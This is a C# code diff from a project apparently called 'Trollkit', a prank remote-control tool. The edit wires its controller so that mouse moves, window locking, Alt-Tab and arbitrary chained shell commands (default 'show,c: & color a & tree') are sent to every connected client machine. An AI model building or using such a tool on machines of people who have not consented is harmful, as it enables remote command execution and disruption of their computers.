@@ -14,29 +14,39 @@ namespace Trollkit_Library.ViewModels.Commands
     {
 		private Server _server;
 		private string handler;
-		public WindowsCommands(Server server, string handler)
-		{
-			_server = server;
-			this.handler = handler;
-		}
 
+		//buttons
 		public ICommand MousePosition { get { return new SendServerCommand(SendMousePosition); } }
 		public ICommand Go { get { return new SendServerCommand(SendGo); } }
 		public ICommand LockWindows { get { return new SendServerCommand(SendLockWindowsk); } }
 		public ICommand AltTab { get { return new SendServerCommand(SendAltTab); } }
 
+		//textboxes
+		public string XCoordinate { get; set; }
+		public string YCoordinate { get; set; }
+		public string CommandText { get; set; }
+
+		public WindowsCommands(Server server, string handler)
+		{
+			_server = server;
+			this.handler = handler;
+
+			XCoordinate = "0";
+			YCoordinate = "0";
+			CommandText = "show,c: & color a & tree";
+		}
 
         private void SendMousePosition()
         {
             //string X = TbXcoordinate.Text;
             //string Y = TbYcoordinate.Text;
-            TransferCommandObject returnObject = new TransferCommandObject { Command = "MousePosition", Handler = handler, Value = ""};//$"{X},{Y}" };
+            TransferCommandObject returnObject = new TransferCommandObject { Command = "MousePosition", Handler = handler, Value = $"{XCoordinate},{YCoordinate}" };
             _server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
         }
 
         private void SendGo()
         {
-            TransferCommandObject returnObject = new TransferCommandObject { Command = "Command", Handler = handler, Value = ""}; //$"{TbComammand.Text},hidden" };
+            TransferCommandObject returnObject = new TransferCommandObject { Command = "Command", Handler = handler, Value = CommandText};
              _server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
         }
 
